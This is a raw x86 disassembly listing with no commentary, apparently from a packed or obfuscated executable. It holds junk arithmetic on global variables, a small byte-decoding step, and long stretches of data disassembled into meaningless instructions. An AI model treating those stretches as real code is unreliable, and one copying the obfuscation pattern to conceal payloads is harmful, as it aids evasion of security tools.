  4040e7:	xor    DWORD PTR ds:0x433633,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x433673
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4335ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433547,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43365b
  404131:	and    DWORD PTR ds:0x433627,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43353f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433543
  404157:	or     ecx,DWORD PTR ds:0x433597
  40415d:	mov    DWORD PTR ds:0x433543,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4335f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43365b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041aa:	adc    ah,dl
  4041ac:	cmp    eax,0x7c7c24a8
  4041b1:	stos   DWORD PTR es:[edi],eax
  4041b2:	jg     0x404230
  4041b4:	jl     0x404212
  4041b6:	dec    ebp
  4041b7:	xchg   esi,eax
  4041b8:	mov    cl,BYTE PTR [ecx]
  4041ba:	sbb    esp,ecx
  4041bc:	pop    ds
  4041bd:	enter  0xcb3d,0xd1
  4041c1:	xor    edi,ecx
  4041c3:	xor    ax,0x22a9
  4041c7:	pop    DWORD PTR [ebx-0x1ec37aa5]
  4041cd:	cmc    
  4041ce:	push   ss
  4041cf:	ror    DWORD PTR [edx+0x5091ba23],1
  4041d5:	retf   0xfee9
  4041d8:	push   edi
  4041d9:	sti    
  4041da:	stos   BYTE PTR es:[edi],al
  4041db:	cmp    DWORD PTR [esi-0x48],0x4e0cb772
  4041e2:	jb     0x40425d
  4041e4:	push   edi
  4041e5:	xchg   ebx,eax
  4041e6:	cli    
  4041e7:	inc    ecx
  4041e8:	int3   
  4041e9:	lock call 0x12f7:0xe6894169
  4041f1:	in     eax,dx
  4041f2:	iret   
  4041f3:	out    dx,eax
  4041f4:	dec    DWORD PTR [edi-0x6e]
  4041f7:	pop    DWORD PTR [edi]
  4041f9:	sahf   
  4041fa:	(bad)  
  4041fc:	pop    ebx
  4041fd:	xor    DWORD PTR [edi-0x4a522686],edx
  404203:	je     0x4041d3
  404205:	mov    ?,WORD PTR [eax]
  404207:	dec    ebp
  404208:	ja     0x404245
  40420a:	mov    cs,WORD PTR fs:[ecx+0x474aecf2]
  404211:	imul   ecx,DWORD PTR [ecx],0xffffffde
  404214:	imul   ecx,ebp,0xffffffa2
  404217:	add    eax,0xd4bbe13d
  40421c:	push   eax
  40421d:	shl    ebx,cl
  40421f:	leave  
  404220:	out    0xb9,eax
  404222:	pop    es
  404223:	stos   DWORD PTR es:[edi],eax
  404224:	mov    ds,ebx
  404226:	cmp    ch,0xd2
  404229:	es dec ebx
  40422b:	ficomp DWORD PTR [esi]
  40422d:	mov    al,ds:0x8a35f555
  404232:	xchg   BYTE PTR [edi+0x33d7bc1],ah
  404238:	dec    esi
  404239:	into   
  40423a:	jmp    0x3146166b
  40423f:	jb     0x404209
  404241:	push   ebp
  404242:	xchg   DWORD PTR [eax+0x38],edx
  404245:	mov    ah,0x62
  404247:	or     edx,DWORD PTR [ecx-0x40]
  40424a:	sub    eax,0x3b851982
  40424f:	xchg   esi,eax
  404250:	pop    ds
  404251:	retf   
  404252:	pusha  
  404253:	inc    ebx
  404254:	inc    edx
  404255:	pop    eax
  404256:	scas   al,BYTE PTR es:[edi]
  404257:	inc    esi
  404258:	cmp    eax,0x21876a67
  40425d:	jo     0x404215
  40425f:	(bad)  
  404261:	pop    edi
  404262:	mov    dh,0x10
  404264:	dec    BYTE PTR [ebx-0x4d]
  404267:	neg    DWORD PTR [ecx-0x59]
  40426a:	adc    DWORD PTR [ebp+edi*8+0x52021436],0xffffffa9
  404272:	add    cl,dl
  404274:	ins    BYTE PTR es:[edi],dx
  404275:	out    0xbf,al
  404277:	ret    
  404278:	fsubr  DWORD PTR [ebx+edi*1-0x4b]
  40427c:	xor    ecx,DWORD PTR es:[esi+0xf67de83]
  404283:	out    0xe8,al
  404285:	mov    al,0x6d
  404287:	cmp    esi,DWORD PTR [ebp+0x20674cd9]
  40428d:	rcr    DWORD PTR [ebx+0x76],cl
  404290:	ja     0x4042ae
  404292:	ins    BYTE PTR es:[edi],dx
  404293:	push   0x92fcf261
  404298:	ror    BYTE PTR [ebx-0x54fae98f],1
  40429e:	div    esp
  4042a0:	xor    eax,edx
  4042a2:	pop    edi
  4042a3:	push   esi
  4042a4:	loopne 0x404286
  4042a6:	call   0xbb1f:0xe7920957
  4042ad:	adc    eax,DWORD PTR [edx+0x36]
  4042b0:	mov    eax,ds:0xf4484c6
  4042b5:	xchg   ecx,eax
  4042b6:	(bad)  
  4042b8:	mov    dh,0xaf
  4042ba:	inc    edi
  4042bb:	out    0x9f,al
  4042bd:	dec    ebp
  4042be:	push   edx
  4042bf:	and    dl,bh
  4042c1:	jg     0x404312
  4042c3:	fs ins DWORD PTR es:[edi],dx
  4042c5:	pop    edi
  4042c6:	hlt    
  4042c7:	out    0xe5,eax
  4042c9:	push   es
  4042ca:	xor    DWORD PTR [ecx+edx*2+0x20],edx
  4042ce:	adc    DWORD PTR [esi+0x54],eax
  4042d1:	fnstcw WORD PTR [ebp-0x37d65554]
  4042d7:	nop
  4042d8:	in     al,dx
  4042d9:	loope  0x404322
  4042db:	test   bh,0xdd
  4042de:	sbb    esp,DWORD PTR [edi]
  4042e0:	das    
  4042e1:	outs   dx,BYTE PTR ds:[esi]
  4042e2:	dec    esi
  4042e3:	mov    esi,0xe1e5f598
  4042e8:	ja     0x4042ea
  4042ea:	sub    ebx,DWORD PTR [ebx-0x45]
  4042ed:	xchg   DWORD PTR [esi],edx
  4042ef:	inc    ebx
  4042f0:	push   ebx
  4042f1:	fxch   st(6)
  4042f3:	into   
  4042f4:	out    dx,eax
  4042f5:	int3   
  4042f6:	push   eax
  4042f7:	(bad)  
  4042f8:	call   0xda5e772c
  4042fd:	sahf   
  4042fe:	mov    esp,0x5e17401c
  404303:	xchg   ebp,eax
  404304:	push   cs
  404305:	in     al,0x3d
  404307:	scas   al,BYTE PTR es:[edi]
  404308:	adc    BYTE PTR [esi+0x20],0x7f
  40430c:	xchg   edx,eax
  40430e:	jge    0x404307
  404310:	cld    
  404311:	and    DWORD PTR [ecx-0x53],0xffffffdb
  404315:	fst    DWORD PTR [eax+0x2511dbb0]
  40431b:	jp     0x4042db
  40431d:	mov    eax,ds:0x20c475b1
  404322:	jb     0x404377
  404324:	sub    ecx,DWORD PTR [ecx+0x26]
  404327:	test   al,0x44
  404329:	xchg   edi,eax
  40432a:	mov    dh,0xb7
  40432c:	jnp    0x4042fa
  40432e:	imul   ecx,DWORD PTR [eax],0x2
  404331:	ins    BYTE PTR es:[edi],dx
  404332:	cwde   
  404333:	es xor al,0x1a
  404336:	ret    0x1f45
  404339:	lods   al,BYTE PTR ds:[esi]
  40433a:	std    
  40433b:	cmp    al,0xed
  40433d:	pop    ss
  40433e:	pop    ecx
  40433f:	shr    DWORD PTR ds:0x76ab46fc,1
  404345:	jle    0x4042dd
  404347:	adc    ah,dh
  404349:	mov    ds:0x5dd718dc,eax
  40434e:	sub    al,BYTE PTR [edi+0x37]
  404351:	mov    esp,0xf339b5e2
  404356:	das    
  404357:	add    al,0xe8
  404359:	and    eax,0xc0bfc5b3
  40435e:	data16 (bad) 
  404360:	jmp    0x4b91:0x9318271b
  404367:	inc    ebx
  404368:	std    
  404369:	adc    dl,BYTE PTR [esi-0x7f]
  40436c:	or     eax,0x43361f
  404371:	inc    ebx
  404372:	inc    esi
  404373:	add    BYTE PTR [eax],al
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43362f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43362f,0x4335ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	add    DWORD PTR [eax+ebp*8-0x13],0xffffffe7
  4043a6:	es jl  0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x404424
  4043ae:	fidiv  DWORD PTR [edx-0x6a]
  4043b1:	pop    es
  4043b2:	repnz pop edx
  4043b4:	nop
  4043b5:	les    edi,FWORD PTR [edx+0x4e]
  4043b8:	sub    ch,BYTE PTR [esi+0x2ef7bc64]
  4043be:	sub    edi,DWORD PTR [esi]
  4043c0:	test   DWORD PTR [ebx+0x594f47b7],edi
  4043c6:	or     eax,0x9a7edf66
  4043cb:	out    0x35,eax
  4043cd:	not    BYTE PTR [edi+eax*8+0x2850d91b]
  4043d4:	adc    eax,0x9ed77c63
  4043d9:	xchg   ecx,eax
  4043da:	das    
  4043db:	xor    BYTE PTR [esi+edi*2-0x6ac379ce],bl
  4043e2:	add    DWORD PTR [edi+0x64],0xfffffff1
  4043e6:	rcr    DWORD PTR [edi+0x3722a180],0xdb
  4043ed:	gs ins BYTE PTR es:[edi],dx
  4043ef:	into   
  4043f0:	cmp    bh,dl
  4043f2:	mov    edx,0x4812df27
  4043f7:	arpl   WORD PTR [edi-0x48],cx
  4043fa:	mov    ebx,0xdc3fb1d1
  4043ff:	cmp    dl,0xb8
  404402:	dec    esp
  404403:	xchg   edi,eax
  404404:	adc    DWORD PTR [esi-0x37cf5b38],ecx
  40440a:	int3   
  40440b:	jecxz  0x4043e2
  40440d:	adc    dh,BYTE PTR [edi]
  40440f:	ret    0xd0b9
  404412:	popa   
  404413:	rcr    bl,cl
  404415:	(bad)  
  404418:	inc    esi
  404419:	mov    edx,0xbec8630d
  40441e:	test   al,0x4a
  404420:	cdq    
  404421:	and    eax,0xc7111ac4
  404426:	push   esi
  404427:	scas   eax,DWORD PTR es:[edi]
  404428:	xor    BYTE PTR [eax+0x2998a437],0x96
  40442f:	sbb    ecx,DWORD PTR [ebp+0x2c]
  404432:	call   0xde819ed8
  404437:	mov    esi,esp
  404439:	fild   QWORD PTR [edx-0x22]
  40443c:	lods   eax,DWORD PTR ds:[esi]
  40443d:	dec    bx
  40443f:	xor    esi,DWORD PTR [ecx]
  404441:	stos   BYTE PTR es:[edi],al
  404442:	mov    eax,0xccb467cf
  404447:	pop    ds
  404448:	sbb    ebx,ecx
  40444a:	retf   
  40444b:	jl     0x40445f
  40444d:	loope  0x40446b
  40444f:	add    ch,cl
  404451:	or     BYTE PTR [ebp+0x13],0x1b
  404455:	test   al,0x41
  404457:	jb     0x4044cf
  404459:	nop
  40445a:	xor    BYTE PTR [esi-0x5a673469],al
  404460:	aas    
  404461:	cmc    
  404462:	pop    ebp
  404463:	add    ah,BYTE PTR [edx]
  404465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404466:	fdiv   st,st(7)
  404468:	cmp    dl,dl
  40446a:	mov    ch,0xac
  40446c:	cs cdq 
  40446e:	stos   BYTE PTR es:[edi],al
  40446f:	mov    esp,0x7420f01d
  404474:	ds xchg bp,ax
  404477:	mov    eax,ds:0xb51a398f
  40447c:	mov    bl,0x79
  40447e:	add    dh,BYTE PTR [esi+0x6e]
  404481:	or     dl,BYTE PTR [ebp+ecx*2-0x66]
  404485:	push   cs
  404486:	mov    dl,0xcc
  404488:	cli    
  404489:	cmp    DWORD PTR [edx+0x43103390],ecx
  40448f:	std    
  404490:	sub    esp,DWORD PTR [ebp+0x18]
  404493:	or     DWORD PTR [eax-0x61ded272],0xffffffed
  40449a:	dec    ebp
  40449b:	sbb    ebx,DWORD PTR [ebx-0x3d699a50]
  4044a1:	mov    ebp,0xb02f51f2
  4044a6:	push   ds
  4044a7:	push   cs
  4044a8:	or     cl,BYTE PTR [edx-0x1024cc11]
  4044ae:	aam    0x4b
  4044b0:	xchg   edi,eax
  4044b1:	fs mov gs,edx
  4044b4:	(bad)  
  4044b5:	mov    BYTE PTR [eax+ecx*1-0x4014aa46],ch
  4044bc:	add    ch,BYTE PTR [eax]
  4044be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bf:	sti    
  4044c0:	xchg   ebx,eax
  4044c1:	aad    0x56
  4044c3:	test   BYTE PTR [esi-0x2ae4c36c],bh
  4044c9:	add    al,0x1c
  4044cb:	(bad)  
  4044cc:	or     cl,BYTE PTR [edi]
  4044ce:	loope  0x404532
  4044d0:	das    
  4044d1:	out    dx,eax
  4044d2:	sub    al,0x1e
  4044d4:	xchg   ecx,eax
  4044d5:	xchg   DWORD PTR [ecx+0x3cbefa14],esi
  4044db:	xchg   ebx,eax
  4044dc:	jg     0x4044e0
  4044de:	adc    al,0x7c
  4044e0:	inc    ebp
  4044e1:	outs   dx,BYTE PTR ds:[esi]
  4044e2:	out    dx,eax
  4044e3:	(bad)  
  4044e4:	mov    eax,ds:0x6333e249
  4044e9:	por    mm7,QWORD PTR [eax-0x6d]
  4044ed:	inc    esi
  4044ee:	lock jp 0x4044a0
  4044f1:	jle    0x4044ac
  4044f3:	xor    esi,DWORD PTR [ebp-0x3cbd90c9]
  4044f9:	in     al,0x21
  4044fb:	mov    esi,0x87dcdea5
  404500:	cli    
  404501:	sysexit 
  404503:	dec    ebp
  404504:	out    dx,al
  404505:	cmp    bh,BYTE PTR [edx+0x260928b0]
  40450b:	sub    ebx,DWORD PTR [edx+ebp*8-0x64c43666]
  404512:	out    dx,eax
  404513:	pop    es
  404514:	iret   
  404515:	xor    DWORD PTR [ebp+0xf],edi
  404518:	push   ebx
  404519:	scas   eax,DWORD PTR es:[edi]
  40451a:	bound  ecx,QWORD PTR [ebx+0x46007b31]
  404520:	mov    BYTE PTR [edi+0x3d8e14ca],ah
  404526:	mov    ch,0xe8
  404528:	pop    esp
  404529:	(bad)  
  40452a:	jmp    0x4044c6
  40452c:	push   esp
  40452d:	pushf  
  40452e:	sub    esi,esp
  404530:	popf   
  404531:	(bad)  
  404532:	mov    eax,0x6f99c40a
  404537:	mov    dh,0xa
  404539:	inc    ebp
  40453a:	mov    eax,0x29985957
  40453f:	sub    ah,BYTE PTR [eax+0x7f]
  404542:	dec    eax
  404543:	push   edx
  404544:	call   0xc2f3:0xe8671c2d
  40454b:	jg     0x40452c
  40454d:	mov    dl,0xf2
  40454f:	out    dx,al
  404550:	jg     0x404599
  404552:	call   0x1d7a3dde
  404557:	cmp    esi,DWORD PTR [edi]
  404559:	dec    esi
  40455a:	hlt    
  40455b:	mov    esp,0x2fe0c70a
  404560:	sbb    ch,BYTE PTR [ebp+0x3]
  404563:	(bad)  
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4335a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433553,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xbbc2aa9d
  404592:	dec    esp
  404593:	sub    al,0xfc
  404595:	adc    ah,BYTE PTR [eax]
  404597:	jl     0x404615
  404599:	stos   DWORD PTR es:[edi],eax
  40459a:	jg     0x404618
  40459c:	jl     0x404531
  40459e:	inc    ebx
  40459f:	mov    edi,0xba5513e4
  4045a4:	jb     0x4045ad
  4045a6:	fcmovbe st,st(3)
  4045a8:	dec    esi
  4045a9:	dec    ebp
  4045aa:	cmp    BYTE PTR [eax+0x7d],dh
  4045ad:	push   ss
  4045ae:	mov    bl,0x2
  4045b0:	iret   
  4045b1:	xor    eax,0x99def5e0
  4045b6:	test   DWORD PTR [ebx-0x27],esp
  4045b9:	sbb    al,0x5f
  4045bb:	push   0x909a9680
  4045c0:	neg    BYTE PTR [ebx]
  4045c2:	(bad)  
  4045c3:	sti    
  4045c4:	addr16 push eax
  4045c6:	pop    edi
  4045c7:	adc    eax,0xbc343542
  4045cc:	inc    edx
  4045cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045ce:	and    DWORD PTR [ebp+0x6a],0x2103c348
  4045d5:	mov    ds:0xc8ccc667,eax
  4045da:	adc    esp,DWORD PTR [edi]
  4045dc:	jnp    0x40464b
  4045de:	mov    cl,0xd0
  4045e0:	adc    BYTE PTR [ecx-0xf],al
  4045e3:	test   al,0x2f
  4045e5:	and    BYTE PTR [ecx],dl
  4045e7:	mov    cl,0x3d
  4045e9:	sbb    BYTE PTR [ebx],bh
  4045eb:	rcl    BYTE PTR [ecx+0xbd3afa6],0xbf
  4045f2:	add    edi,DWORD PTR [esi-0x36]
  4045f5:	cmp    cl,dh
  4045f7:	fisttp QWORD PTR [edx+0x5a]
  4045fa:	or     edx,DWORD PTR [eax+ebx*1-0x32]
  4045fe:	fimul  WORD PTR [ecx]
  404600:	dec    eax
  404601:	cmp    bl,BYTE PTR [esi+0x43]
  404604:	cld    
  404605:	lods   eax,DWORD PTR ds:[esi]
  404606:	or     eax,0xbecefb59
  40460b:	outs   dx,DWORD PTR ds:[esi]
  40460c:	pop    edx
  40460d:	and    ebp,DWORD PTR [edi+0x5f]
  404610:	in     eax,0xd9
  404612:	inc    BYTE PTR [esi-0x7de04d63]
  404618:	dec    ebp
  404619:	(bad)  
  40461a:	das    
  40461b:	fdivr  QWORD PTR [esi+0x6990db5]
  404621:	xchg   ebp,eax
  404622:	or     eax,0x2d281f78
  404627:	lods   eax,DWORD PTR ds:[esi]
  404628:	out    dx,al
  404629:	sub    ecx,esp
  40462b:	push   ss
  40462c:	push   es
  40462d:	xor    eax,0x1bfa439b
  404632:	addr16 ret 
  404634:	and    bl,dl
  404636:	rol    ebx,1
  404638:	shl    DWORD PTR [edi-0x5e817c48],1
  40463e:	push   esi
  40463f:	in     al,0xc0
  404641:	rcr    BYTE PTR ds:0x14070872,cl
  404647:	sub    al,0x41
  404649:	or     ecx,ebp
  40464b:	mov    ah,0xae
  40464d:	neg    BYTE PTR [ebx-0x3e]
  404650:	leave  
  404651:	xor    al,0x5e
  404653:	mov    al,0x3a
  404655:	add    BYTE PTR [esi+edx*1],ah
  404658:	add    ebp,0x45
  40465b:	mov    dl,0x61
  40465d:	and    edi,DWORD PTR [eax-0x793ff390]
  404663:	(bad)  
  404664:	push   ebx
  404665:	xlat   BYTE PTR ds:[ebx]
  404666:	sbb    al,0x14
  404668:	leave  
  404669:	sub    dh,al
  40466b:	and    al,0x30
  40466d:	dec    edi
  40466e:	or     DWORD PTR [ecx+0x3a57b420],eax
  404674:	push   0x3ad6ad07
  404679:	push   esp
  40467a:	rep ins DWORD PTR es:[edi],dx
  40467c:	retf   0x2fb2
  40467f:	adc    bh,BYTE PTR [edi-0x66]
  404682:	mov    ebp,0xc918ec1b
  404687:	pop    es
  404688:	fist   DWORD PTR [ebp-0x16]
  40468b:	iret   
  40468c:	iret   
  40468d:	mov    esp,0x543d77d8
  404692:	iret   
  404693:	std    
  404694:	xor    ch,cl
  404696:	mov    cl,BYTE PTR [ebp+ebx*1-0x71f81794]
  40469d:	lahf   
  40469e:	cld    
  40469f:	in     al,0x18
  4046a1:	and    esp,DWORD PTR [ecx+0x395ee959]
  4046a7:	dec    esi
  4046a8:	ficom  WORD PTR gs:[ebp+esi*8+0x1ac7589a]
  4046b0:	xchg   ebp,eax
  4046b1:	retf   0x7c28
  4046b4:	sbb    BYTE PTR [edi-0x257bf2e1],ah
  4046ba:	pop    ecx
  4046bb:	div    BYTE PTR [ecx+0x70594a51]
  4046c1:	into   
  4046c2:	xor    eax,ebx
  4046c4:	daa    
  4046c5:	lods   al,BYTE PTR ds:[esi]
  4046c6:	sub    DWORD PTR [eax],ebp
  4046c8:	adc    ecx,edi
  4046ca:	pop    ebp
  4046cb:	cdq    
  4046cc:	pop    es
  4046cd:	cs pop edx
  4046cf:	add    eax,edi
  4046d1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d3:	call   0xb51c:0xbc8cdc14
  4046da:	stc    
  4046db:	sub    ch,bl
  4046dd:	dec    eax
  4046de:	xor    DWORD PTR [ebp-0x60],esi
  4046e1:	jl     0x404680
  4046e3:	adc    DWORD PTR [eax],edx
  4046e5:	into   
  4046e6:	icebp  
  4046e7:	adc    bh,BYTE PTR [edi]
  4046e9:	mov    esp,0x8a1f8d8a
  4046ee:	cld    
  4046ef:	mov    ch,0x54
  4046f1:	bound  ecx,QWORD PTR [ebx-0x371f5f64]
  4046f7:	call   0x1785:0x408a5857
  4046fe:	dec    esi
  4046ff:	xchg   edx,eax
  404700:	ds out dx,al
  404702:	xor    BYTE PTR [esp+0x553e92ea],bh
  404709:	xlat   BYTE PTR ds:[ebx]
  40470a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40470b:	bound  ecx,QWORD PTR [ebx-0x72]
  40470e:	scas   eax,DWORD PTR es:[edi]
  40470f:	out    0x3,eax
  404711:	ror    eax,0xdd
  404714:	cwde   
  404715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404716:	call   eax
  404718:	leave  
  404719:	test   DWORD PTR ds:0xb1057a47,edi
  40471f:	in     eax,dx
  404720:	shl    DWORD PTR [ecx],0x4e
  404723:	jmp    0x4047a0
  404725:	call   0x6638b9e4
  40472a:	cmc    
  40472b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40472c:	loope  0x40479a
  40472e:	cli    
  40472f:	push   edi
  404730:	dec    edx
  404731:	neg    BYTE PTR [esi+0x78]
  404734:	fidivr DWORD PTR [edx+0x24]
  404737:	out    0xbb,eax
  404739:	pop    esp
  40473a:	jo     0x40473f
  40473c:	(bad)  
  40473d:	mov    esi,0xf3554bb1
  404742:	push   esp
  404743:	bound  esp,QWORD PTR [esi-0x5cc3e0f9]
  404749:	fist   DWORD PTR [ebx+0x41]
  40474c:	inc    esi
  40474d:	xchg   edx,eax
  40474e:	(bad)  
  40474f:	or     DWORD PTR [ebx+0x554889c],ecx
  404755:	test   al,0x40
  404757:	mov    DWORD PTR ds:0x43354f,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433657
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43353f,0x14
  40477d:	cmp    DWORD PTR ds:0x43353f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43353f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43353f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43353f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43353f,eax
  4047c3:	mov    eax,ds:0x43353f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43353f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4335e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4335d7,0x43366f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4335db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4335e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4335f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404827
  40481f:	inc    ecx
  404820:	mov    ds:0x7c234909,al
  404825:	jl     0x4047d2
  404827:	jg     0x4048a5
  404829:	jl     0x404810
  40482b:	nop
  40482c:	popf   
  40482d:	into   
  40482e:	xchg   edx,eax
  40482f:	mov    edi,0xde08cd20
  404834:	xor    dh,0xa6
  404837:	repz pusha 
  404839:	adc    bh,BYTE PTR [ebp+eiz*1+0x699a6e0b]
  404840:	pop    ebx
  404841:	(bad)  
  404842:	cmp    BYTE PTR [esi],ch
  404844:	and    DWORD PTR [ebp+0x72beaf62],esi
  40484a:	aas    
  40484b:	push   esi
  40484c:	retf   
  40484d:	dec    edi
  40484e:	mov    ebx,0x59073497
  404853:	mov    cl,0xb1
  404855:	xchg   edx,eax
  404856:	xchg   DWORD PTR [esi-0x7e],eax
  404859:	pop    ebx
  40485a:	or     BYTE PTR [eax-0x72c17e58],ch
  404860:	cmc    
  404861:	push   ecx
  404862:	sub    BYTE PTR [ecx],ah
  404864:	out    dx,al
  404865:	jmp    0xb64715bc
  40486a:	jle    0x404832
  40486c:	inc    esi
  40486d:	sub    BYTE PTR [edi+0xa1bb565],al
  404873:	(bad)  
  404874:	es iret 
  404876:	loopne 0x40487f
  404878:	leave  
  404879:	outs   dx,DWORD PTR ds:[esi]
  40487a:	arpl   WORD PTR [ecx],sp
  40487c:	cwde   
  40487d:	imul   BYTE PTR [ebp+ebx*4-0x74]
  404881:	cs jno 0x40484b
  404884:	ins    BYTE PTR es:[edi],dx
  404885:	push   es
  404886:	psrad  mm2,QWORD PTR [ebx]
  404889:	push   edi
  40488a:	dec    ebp
  40488b:	(bad)  
  40488c:	fiadd  WORD PTR [ebx]
  40488e:	jb     0x4048de
  404890:	jp     0x404884
  404892:	ret    
  404893:	stc    
  404894:	cld    
  404895:	mov    esp,0x37c7211f
  40489a:	int    0xb7
  40489c:	mov    esi,0x153c669f
  4048a1:	mov    al,0x6e
  4048a3:	or     eax,0x60860ed6
  4048a8:	jle    0x40482f
  4048aa:	(bad)  
  4048ab:	fcomp  DWORD PTR [edi]
  4048ad:	and    BYTE PTR [ebx+0x7e88a8e1],dl
  4048b3:	pop    es
  4048b4:	imul   eax,ebx,0x4c108d95
  4048ba:	adc    ebp,DWORD PTR [ebx+0x5abe9e9]
  4048c0:	out    dx,eax
  4048c1:	nop
  4048c2:	cs jns 0x404942
  4048c5:	mov    al,0x44
  4048c7:	push   ds
  4048c8:	mov    al,ds:0x7f1f850f
  4048cd:	mov    bl,0x4d
  4048cf:	ja     0x404884
  4048d1:	sti    
  4048d2:	icebp  
  4048d3:	cmp    ah,BYTE PTR [esp+ebx*8+0x3efe3d6a]
  4048da:	push   ds
  4048db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048dc:	or     al,0xd1
  4048de:	push   edi
  4048df:	arpl   WORD PTR [edx],bx
  4048e1:	mov    BYTE PTR [ebp+0x4f],dl
  4048e4:	cmp    esp,DWORD PTR [eax]
  4048e6:	out    0x86,al
  4048e8:	pop    edi
  4048e9:	push   es
  4048ea:	lods   al,BYTE PTR ds:[esi]
  4048eb:	fwait
  4048ec:	out    dx,al
  4048ed:	shl    dl,cl
  4048ef:	fisub  WORD PTR [esi]
  4048f1:	mov    esi,0xf79e0182
  4048f6:	in     al,0xc3
  4048f8:	dec    eax
  4048f9:	shr    DWORD PTR cs:[ebp-0x5ce15171],1
  404900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404901:	mov    BYTE PTR [ebx],cl
  404903:	scas   al,BYTE PTR es:[edi]
  404904:	lods   al,BYTE PTR ds:[esi]
  404905:	cmp    dh,bh
  404907:	mov    ecx,0x5578cf56
  40490c:	and    eax,0xa1a03d4a
  404911:	cmp    ch,BYTE PTR [esi-0x5dc4fc05]
  404917:	(bad)  
  404919:	out    0x19,al
  40491b:	add    bh,bl
  40491d:	call   0x9ae4:0xa86db22e
  404924:	dec    esp
  404925:	shl    DWORD PTR [eax],1
  404927:	fnsave [ebp-0x3e4df6ae]
  40492d:	jno    0x4048be
  40492f:	and    ah,BYTE PTR [edx-0x188200d3]
  404935:	sbb    BYTE PTR [esi+0x7ad6ba69],bl
  40493b:	push   es
  40493c:	mov    esp,0xd7930075
  404941:	pop    esp
  404942:	sbb    ecx,DWORD PTR [eax+ebx*8]
  404945:	jo     0x4049a2
  404947:	(bad)  [edx+0x1c]
  40494a:	mov    ds:0x37258e8e,al
  40494f:	inc    ebx
  404950:	jmp    0x5b509613
  404955:	pop    edx
  404956:	sub    ebx,DWORD PTR [edi+0x36]
  404959:	test   DWORD PTR [ebx-0x59e87cff],eax
  40495f:	(bad)  
  404960:	pop    ds
  404961:	jbe    0x4048f7
  404963:	cmc    
  404964:	fbstp  TBYTE PTR [edx]
  404966:	es scas al,BYTE PTR es:[edi]
  404968:	test   ah,al
  40496a:	sbb    esi,DWORD PTR [edx]
  40496c:	inc    esp
